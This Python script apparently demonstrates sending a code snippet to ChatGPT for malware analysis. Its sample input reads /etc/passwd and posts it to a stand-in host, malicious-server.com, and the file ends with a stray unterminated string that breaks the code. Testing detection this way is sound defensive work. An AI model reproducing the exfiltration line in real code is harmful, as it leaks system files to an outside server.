import openai

# Initialize the OpenAI API with your API key
openai.api_key = 'YOUR_OPENAI_API_KEY'

def analyze_code_with_chatgpt(code_snippet):
    """
    Analyze a code snippet using ChatGPT.
    """
    # Prepare the prompt for ChatGPT
    prompt = {
        "model": "gpt-3.5-turbo",  # Ensure this is a valid chat model name
        "messages": [
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": f"Please analyze the following code snippet for any suspicious or malicious behavior:\n\n{code_snippet}\n\nWhat can you infer from this code?"}
        ]
    }
    
    # Send the prompt to ChatGPT using the chat completions endpoint
    response = openai.ChatCompletion.create(**prompt)
    return response.choices[0].message['content'].strip()

# Sample suspicious code snippet
code_snippet = """
def suspicious_function():
    import os
    # Read environment variables
    user_data = os.environ.get('USER_DATA')
    # Check if a specific file exists
    if os.path.exists('/etc/passwd'):
        with open('/etc/passwd', 'r') as file:
            content = file.read()
        # Send the content to an external server
        requests.post('http://malicious-server.com/upload', data=content)
    print("This is a test function.")
"""

print(analyze_code_with_chatgpt(code_snippet))      "count number code and suggest a name 